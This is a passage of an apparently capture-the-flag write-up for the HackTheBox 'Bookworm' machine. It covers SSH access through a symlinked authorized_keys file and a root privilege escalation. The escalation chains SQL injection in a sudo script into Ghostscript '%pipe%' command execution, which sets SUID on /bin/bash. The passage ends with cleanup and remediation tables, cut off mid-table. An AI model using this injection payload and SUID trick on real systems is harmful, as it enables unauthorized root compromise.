+<a href="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Capture_dcran_2023-06-03_002751.png"><img src="HackTheBox%20-%20Bookworm%20(Insane)%201d96cef73dc648d0b4185f9889ec5082/Capture_dcran_2023-06-03_002751.png"/></a>
+<p id="f9e34749-a21d-48fa-b46a-9d0acca14644">
+Our EPUB should be extracted to <strong>/tmp/exploit/</strong>
+. Our SSH public key in <strong>cover_image.jpg</strong>
+ should be written on the <strong>symbolic link</strong>
+ named <strong>cover_image.jpg</strong>
+ that points to <strong>/home/neil/.ssh/authorized_keys</strong>
+. After we sent the request, we can try to login as <strong>neil</strong>
+ via SSH using the corresponding SSH private key we generated earlier : </p>
+<pre class="code" id="cee06ab5-b4b4-430b-a70b-d2cb275c133b"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh neil@10.129.174.177 -i id_rsa
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-149-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 02 Jun 2023 10:58:33 PM UTC
+
+  System load:           0.0
+  Usage of /:            77.1% of 6.24GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             247
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.174.177
+  IPv6 address for eth0: dead:beef::250:56ff:fe96:489
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Jun  2 22:04:02 2023 from 10.10.16.2
+neil@bookworm:~$</code>
+</pre>
+<p id="233f7842-583f-4dea-9549-3d17199181bf">
+Now we are logged in as <strong>neil</strong>
+.</p>
+<h2 id="7189b61e-34b6-4144-8d6c-2844e178552b">Privilege escalation (root)</h2>
+<p id="aaf798f0-865e-41e8-8f8b-34c8b3c5e228">
+Let’s take a look at our <strong>sudo rights</strong>
+ : </p>
+<pre class="code" id="521c6ea1-3958-461f-bd52-24d03f5dd2f8"><code>neil@bookworm:~$ sudo -l
+Matching Defaults entries for neil on bookworm:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User neil may run the following commands on bookworm:
+    (ALL) NOPASSWD: /usr/local/bin/genlabel</code>
+</pre>
+<p id="d327efed-1f1d-40f9-86c7-49edd85cafa6">
+We can run <strong>/usr/local/bin/genlabel</strong>
+ as <strong>root</strong>
+ without password. Let’s verify what type of file is this : </p>
+<pre class="code" id="0493399e-35a4-4777-84b9-26fb0b72ade2"><code>neil@bookworm:~$ file /usr/local/bin/genlabel 
+/usr/local/bin/genlabel: Python script, ASCII text executable</code>
+</pre>
+<p id="90631ad3-7427-4314-b083-81ceed497928">
+It’s a python script. Let’s take a look at the source code of this script : </p>
+<pre class="code" id="a30b1ff6-bccb-4e03-ae57-f1d29e034cfa"><code>#!/usr/bin/env python3
+
+import mysql.connector
+import sys
+import tempfile
+import os
+import subprocess
+
+with open("/usr/local/labelgeneration/dbcreds.txt", "r") as cred_file:
+    db_password = cred_file.read().strip()
+
+cnx = mysql.connector.connect(user='bookworm', password=db_password,
+                              host='127.0.0.1',
+                              database='bookworm')
+
+if len(sys.argv) != 2:
+    print("Usage: genlabel [orderId]")
+    exit()
+
+try:
+    cursor = cnx.cursor()
+    query = "SELECT name, addressLine1, addressLine2, town, postcode, Orders.id as orderId, Users.id as userId FROM Orders LEFT JOIN Users On Orders.userId = Users.id WHERE Orders.id = %s" % sys.argv[1]
+
+    cursor.execute(query)
+
+    temp_dir = tempfile.mkdtemp("printgen")
+    postscript_output = os.path.join(temp_dir, "output.ps")
+    # Temporary until our virtual printer gets fixed
+    pdf_output = os.path.join(temp_dir, "output.pdf")
+
+    with open("/usr/local/labelgeneration/template.ps", "r") as postscript_file:
+        file_content = postscript_file.read()
+
+    generated_ps = ""
+
+    print("Fetching order...")
+    for (name, address_line_1, address_line_2, town, postcode, order_id, user_id) in cursor:
+        file_content = file_content.replace("NAME", name) \
+                        .replace("ADDRESSLINE1", address_line_1) \
+                        .replace("ADDRESSLINE2", address_line_2) \
+                        .replace("TOWN", town) \
+                        .replace("POSTCODE", postcode) \
+                        .replace("ORDER_ID", str(order_id)) \
+                        .replace("USER_ID", str(user_id))
+
+    print("Generating PostScript file...")
+    with open(postscript_output, "w") as postscript_file:
+        postscript_file.write(file_content)
+
+    print("Generating PDF (until the printer gets fixed...)")
+    output = subprocess.check_output(["ps2pdf", "-dNOSAFER", "-sPAPERSIZE=a4", postscript_output, pdf_output])
+    if output != b"":
+        print("Failed to convert to PDF")
+        print(output.decode())
+
+    print("Documents available in", temp_dir)
+    os.chmod(postscript_output, 0o644)
+    os.chmod(pdf_output, 0o644)
+    os.chmod(temp_dir, 0o755)
+    # Currently waiting for third party to enable HTTP requests for our on-prem printer
+    # response = requests.post("http://printer.bookworm-internal.htb", files={"file": open(postscript_output)})
+
+except Exception as e:
+    print("Something went wrong!")
+    print(e)
+
+cnx.close()</code>
+</pre>
+<p id="8dd55597-5549-4466-8a64-ed24e6eeaf30">
+The data retrieved from bookworm database will be inserted in a <strong>PostScript</strong>
+ which will be then executed with <strong>ps2pdf</strong>
+. The command is executed with the <strong>-dNOSAFER</strong>
+ option. According to the official documentation for <a href="https://www.ghostscript.com/"><strong>Ghostscript</strong>
+</a>
+</p>
+<p id="587595ec-f5f8-43d7-b153-41f71fc87a64">
+This flag disables <code>SAFER</code>
+ mode until the <code>.setsafe</code>
+ procedure is run. This is intended for clients or scripts that cannot operate in <code>SAFER</code>
+ mode. If Ghostscript is started with <code>-dNOSAFER</code>
+ or <code>-dDELAYSAFER</code>
+, PostScript programs are allowed to <strong>read, write, rename or delete any files in the system</strong>
+ that are not protected by operating system permissions.</p>
+<p id="3eb15e16-10b0-4c68-b87a-fce4abb56aeb">
+To execute a bash script from a <strong>PostScript</strong>
+, the syntax is the following : </p>
+<pre class="code" id="0c9655e5-506e-40ad-adf1-b81b692917d4"><code>(%pipe%/path/to/file.sh) (r) file</code>
+</pre>
+<p id="7735cddd-f109-4d6a-81c6-09cb3cf5804d">
+It appears that <strong>no input sanitization</strong>
+ is done on the <strong>id</strong>
+ entered by the user, so it might be vulnerable to <strong>SQLi (Structured Query Language Injection)</strong>
+. First, let’s try to inject data in the query : </p>
+<pre class="code" id="0deedfa4-1081-4c9c-ab9b-42a6e89777de"><code>neil@bookworm:~$ sudo /usr/local/bin/genlabel '0 UNION ALL SELECT "test1","test2","test3","test4","test5",1,1'
+Fetching order...
+Generating PostScript file...
+Generating PDF (until the printer gets fixed...)
+Documents available in /tmp/tmpc1wmbjc4printgen</code>
+</pre>
+<p id="4049d5b6-74aa-4c49-bc5c-a84ddc719caf">
+Now, let’s take a look at <strong>/tmp/tmpc1wmbjc4printgen</strong>
+ directory : </p>
+<pre class="code" id="e932a272-2a35-4683-a47d-829035e4e8b1"><code>neil@bookworm:/tmp/tmpc1wmbjc4printgen$ ls -la
+total 56
+drwxr-xr-x  2 root root  4096 Jun  3 10:06 .
+drwxrwxrwt 20 root root  4096 Jun  3 10:07 ..
+-rw-r--r--  1 root root 44505 Jun  3 10:06 output.pdf
+-rw-r--r--  1 root root  1771 Jun  3 10:06 output.ps</code>
+</pre>
+<p id="12198510-6a82-426e-b472-31204d3642c3">
+We can read the file <strong>output.ps</strong>
+ (which is the PostScript executed to generated output.pdf) : </p>
+<pre class="code" id="c15c8b89-c3d3-4bda-9074-15bc11169df0"><code>neil@bookworm:/tmp/tmpc1wmbjc4printgen$ cat output.ps
+%!PS
+
+/Courier
+60 selectfont
+50 750 moveto
+(BOOKWORM) show
+
+/Courier-bold
+50 selectfont
+50 700 moveto
+(4 HOUR) show
+
+/Courier-bold
+50 selectfont
+50 650 moveto
+(DELIVERY) show
+
+gsave
+ 370 620 translate     % set lower left of image at (360, 72)
+  160 160 scale         % size of rendered image is 175 points by 47 points
+  901                  % number of columns per row
+  901                    % number of rows
+  8                    % bits per color channel (1, 2, 4, or 8)
+  [901 0 0 -901 0 901]       % transform array... maps unit square to pixel
+  (/usr/local/labelgeneration/book.jpg) (r) file /DCTDecode filter % opens the file and filters the image data
+  false                 % pull channels from separate sources
+  3                    % 3 color channels (RGB)
+  colorimage
+grestore
+
+newpath
+10 590 moveto
+585 590  lineto
+5 setlinewidth
+stroke
+
+/Courier-bold
+20 selectfont
+50 550 moveto
+(test1) show
+
+/Courier
+20 selectfont
+50 525 moveto
+(test2) show
+
+/Courier
+20 selectfont
+50 500 moveto
+(test3) show
+
+/Courier
+20 selectfont
+50 475 moveto
+(test4) show
+
+/Courier
+20 selectfont
+50 450 moveto
+(test5) show
+
+
+newpath
+10 400 moveto
+585 400  lineto
+5 setlinewidth
+stroke
+
+/Courier
+20 selectfont
+50 350 moveto
+(Courier - Please ensure order is) show
+
+/Courier
+20 selectfont
+50 320 moveto
+(marked as completed on website) show
+
+newpath
+10 280 moveto
+585 280  lineto
+5 setlinewidth
+stroke
+
+/Courier-bold
+20 selectfont
+50 230 moveto
+(Customer Reference) show
+
+/Courier
+20 selectfont
+50 200 moveto
+(1) show
+
+/Courier-bold
+20 selectfont
+50 150 moveto
+(Order Reference) show
+
+/Courier
+20 selectfont
+50 120 moveto
+(1) show
+
+
+
+newpath
+10 10 moveto
+10 832 lineto
+585 832 lineto
+585 10 lineto
+10 10 lineto
+5 setlinewidth
+stroke
+
+showpage             % print all on the page</code>
+</pre>
+<p id="1101eb41-0ab3-4e6b-a715-260b9b3724e7">
+The data we injected in the SQL query was successfully written in the <strong>PostScript</strong>
+ file. We should be able to inject a command in the <strong>PostScript</strong>
+ file to execute a malicious file. Since we can run the program as <strong>root</strong>
+, the malicious script will also be run with <strong>root</strong>
+ privileges. So, it might lead to full system compromission. Let’s create a malicious file that will set the <strong>SUID</strong>
+ bit on <strong>/bin/bash</strong>
+ : </p>
+<pre class="code" id="795a8b9d-a935-4636-b6a0-23cc75333775"><code>neil@bookworm:/tmp$ cat privesc.sh 
+#!/bin/bash
+
+chmod +s /bin/bash</code>
+</pre>
+<p id="8c2b3b43-a5e3-469c-93ec-d6cae113bd93">
+Now, we have to make sure it is executable by everyone : </p>
+<pre class="code" id="8bae53af-1f07-4c15-aaa4-5e258ea33788"><code>neil@bookworm:/tmp$ chmod a+x privesc.sh</code>
+</pre>
+<p id="ae2cbb7a-6d72-4f96-956b-ce94654ba2fd">
+We want this line to be in the <strong>PostScript</strong>
+ : </p>
+<pre class="code" id="9efb06d1-078d-4833-b574-ba4ecca37c7e"><code>(%pipe%/tmp/privesc.sh) (r) file</code>
+</pre>
+<p id="f78774e9-fefa-4468-b07e-eff09692c43d">
+Our payload will be injected here in the template <strong>PostScript</strong>
+ file : </p>
+<pre class="code" id="4d3e9bc3-8331-447e-a413-593793ba2870"><code>([PAYLOAD]) show</code>
+</pre>
+<p id="0a11c59b-6f80-4549-8d5b-60cec85cac74">
+So here is the payload we will inject in the <strong>PostScript</strong>
+ file : </p>
+<pre class="code" id="831525b4-94e7-4d63-afe1-2e44d3b7dbc9"><code>%pipe%/tmp/privesc.sh) (r) file %</code>
+</pre>
+<p id="6b2f28ea-90ae-4835-bd99-7f0bd11271f3">
+The last percent character is used to comment the rest of the line. So here is the line that will be written in the <strong>PostScript</strong>
+ file : </p>
+<pre class="code" id="7f77b0e4-51dd-4a44-b838-80c7dd00a028"><code>(%pipe%/tmp/privesc.sh) (r) file %) show</code>
+</pre>
+<p id="199801aa-d69d-4ba9-87ba-c641c5db19e1">
+ Now, we can inject our payload in the SQL query which will be then injected in the <strong>PostScript</strong>
+ file : </p>
+<pre class="code" id="e5591188-abbe-4c3d-9d65-a934d9f6c95f"><code>neil@bookworm:/tmp$ sudo /usr/local/bin/genlabel '0 UNION ALL SELECT "%pipe%/tmp/privesc.sh) (r) file %","test","test","test","test",1,1'
+Fetching order...
+Generating PostScript file...
+Generating PDF (until the printer gets fixed...)
+Documents available in /tmp/tmp13rclcpsprintgen</code>
+</pre>
+<p id="c5d877b3-2f2c-4d0b-b762-6f07333e9cc8">
+Then, let’s check the permissions on <strong>/bin/bash</strong>
+ : </p>
+<pre class="code" id="494983eb-2fd3-42f3-b7a8-51328740c7b5"><code>neil@bookworm:/tmp$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash</code>
+</pre>
+<p id="3d159560-d051-4e6a-9957-93bd4b55b357">
+We can now run <strong>bash -p</strong>
+ to get a shell as <strong>root</strong>
+ : </p>
+<pre class="code" id="00c53601-23ba-4c08-8f0d-ca368550a1dd"><code>neil@bookworm:/tmp$ bash -p
+bash-5.0# whoami
+root</code>
+</pre>
+<h1 id="086a3cf1-00ba-4773-8091-ba6cd2c0276e">Clearing tracks</h1>
+<table id="9b7d1347-d43c-40b9-b8a5-bb54772f529b"><tr id="fdf65db9-db97-41cc-8878-c03aae0107e6"><th id="xDBb">Step</th>
+<th id="^z&gt;Y">Tracks to remove</th>
+</tr>
+<tbody><tr id="68cc6e04-545a-4ccc-aed5-8cb33fc1eb95"><td id="xDBb">Post-exploitation - Privilege escalation (root)</td>
+<td id="^z&gt;Y">- Remove the SUID on /bin/bash- Remove privesc.sh from /tmp- Remove the exploit directory from /tmp</td>
+</tr>
+<tr id="de0c44de-33c6-410b-be53-0d2105f10e8b"><td id="xDBb">Post-exploitation - Privilege escalation (neil)</td>
+<td id="^z&gt;Y">- Remove created files in /home/neil/converter/output and /home/neil/converter/processing- Remove /home/neil/.ssh/authorized_keys</td>
+</tr>
+<tr id="1d644123-505a-4f2e-91f6-e4773f32df06"><td id="xDBb">Enumeration - Web enumeration</td>
+<td id="^z&gt;Y">- Remove the test account from the bookworm database- Remove test orders made with the test account from the bookworm database</td>
+</tr>
+</tbody>
+</table>
+<h1 id="9875ebe5-a153-4335-9e8f-d371f8de41ca">Vulnerabilities summary</h1>
+<h2 id="3ff61b09-bdba-4a0b-b4ff-27ce6e647432">Arbitrary File Upload</h2>
+<table id="2db43604-ca84-455d-bd0b-4c4e471b6ed2"><tr id="0ca7945f-c8f1-4078-ac6a-74ac82f13935"><th id="&lt;?AB">Field</th>
+<th id="BY@B">Value</th>
+</tr>
+<tbody><tr id="a5a40342-0dcd-42a6-bbae-ba40eab19a67"><td id="&lt;?AB">Affected component</td>
+<td id="BY@B">Web server</td>
+</tr>
+<tr id="bdfde5a9-5776-4e10-9f12-bf65a07b1861"><td id="&lt;?AB">CVSS 3.0 score</td>
+<td id="BY@B"><strong>7.5</strong>
+</td>
+</tr>
+<tr id="501bf696-9fd1-4623-9c26-163af6d352b4"><td id="&lt;?AB">Severity</td>
+<td id="BY@B"><strong>HIGH</strong>
+</td>
+</tr>
+<tr id="9ce6daf5-02af-499d-aafc-868cf577905e"><td id="&lt;?AB">Attack vector</td>
+<td id="BY@B"><strong>Network</strong>
+</td>
+</tr>
+<tr id="405c749a-2696-4698-9f92-5d40299513bd"><td id="&lt;?AB">Impact</td>
+<td id="BY@B">Allows an attacker to upload arbitrary file that may contain malicious data like JavaScript code.This has a <strong>high</strong>
+ impact on the <strong>integrity</strong>
+ of the affected component.</td>
+</tr>
+<tr id="6631eae2-ef7c-4fb4-82e5-7b78d3d8d005"><td id="&lt;?AB">Remediation proposition</td>
+<td id="BY@B">Add filters to the file being uploaded as profile picture by users. For exemple, check the Content-Type HTTP header, check the magic numbers (first bytes of the file), append a valid extension to the file to ensure that when accessed it will be interpreted as an image and not as JavaScript code. You could also combine those techniques with a blacklist that prevent an attacker from uploading files that contains strings like “fetch()” or “XMLHttpRequest”.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="b45e354e-4101-473d-ba8d-a1f44f75c59a">Cross Site Scripting</h2>
+<table id="9ffd3d68-90fb-4a48-a633-87ea63202a1b"><tr id="9b66d0ed-10b6-4c4b-9375-ad9becc42724"><th id="&lt;?AB">Field</th>
+<th id="BY@B">Value</th>
+</tr>
+<tbody><tr id="59233bcc-493b-4c2b-bbc2-e02a55062274"><td id="&lt;?AB">Affected component</td>
+<td id="BY@B">Web server</td>
+</tr>
+<tr id="954b8d73-5727-44fa-a20d-3d54d6ebb5b0"><td id="&lt;?AB">CVSS 3.0 score</td>
+<td id="BY@B"><strong>6.5</strong>
+</td>
+</tr>
+<tr id="acb59409-d8ac-48dd-9af3-a5e50e05f52b"><td id="&lt;?AB">Severity</td>
+<td id="BY@B"><strong>MEDIUM</strong>
+</td>
+</tr>
+<tr id="54be50a3-2657-46a3-aa11-56033f5dd941"><td id="&lt;?AB">Attack vector</td>
+<td id="BY@B"><strong>Network</strong>
+</td>
+</tr>
+<tr id="065f628f-408e-47c9-a280-370dd3f91a71"><td id="&lt;?AB">Impact</td>
+<td id="BY@B">Allows an attacker to execute arbitrary JavaScript file on a victim browser when an order is opened.This has a <strong>high</strong>
+ impact on the <strong>confidentiality</strong>
+ of the affected component.</td>
+</tr>
+<tr id="8d6e6f57-a87d-458f-ace0-b37a3c745217"><td id="&lt;?AB">Remediation proposition</td>
+<td id="BY@B">Add filters to user input in the note added to the order. For exemple, you could blacklist “<script></script></td></tr></tbody></table></lines.length;i++){></code></pre>
+</div>
